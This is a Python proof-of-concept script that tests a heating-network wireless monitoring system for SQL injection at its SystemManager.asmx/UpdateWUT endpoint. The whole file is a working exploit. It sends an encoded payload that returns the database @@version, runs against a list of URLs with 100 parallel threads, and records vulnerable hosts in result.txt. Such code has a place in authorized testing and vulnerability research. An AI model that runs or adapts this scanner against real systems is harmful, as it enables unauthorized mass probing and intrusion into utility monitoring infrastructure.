import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner ="""
<<<<<<<<<<热网无线监测系统 SystemManager.asmx SQL注入漏洞>>>>>>>>>                                                  
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="this is a 热网无线监测系统 SystemManager.asmx SQL注入Vulnerability")
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parser.add_argument('-f','-file',dest='file',type=str,help='please input your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/DataSrvs/SystemManager.asmx/UpdateWUT"
    url = target+payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36',
        'Accept-Encoding':'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language':'en-US;q=0.9,en;q=0.8',
        'Content-Type':'application/x-www-form-urlencoded',
        'Connection':'close',
    }
    data = "id=%28SELECT+CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28CASE+WHEN+%281675%3D1675%29+THEN+@@version+ELSE+CHAR%2848%29+END%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29&name=&desc="
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=6)
        if "Microsoft" in res.text:
            print(f"[+]该站点存在sql注入漏洞,url:{target}")
            with open ('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else :
            print("[-]该站点不存在sql注入漏洞 ,url:"+target)
            with open ('without-bug.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
    except Exception as e:
        print(f"[?] 请求发生异常,URL: {target}")
        with open ('warning.txt','a',encoding='utf-8') as fp:
            fp.write(target+"\n")

if __name__ == '__main__':
    main()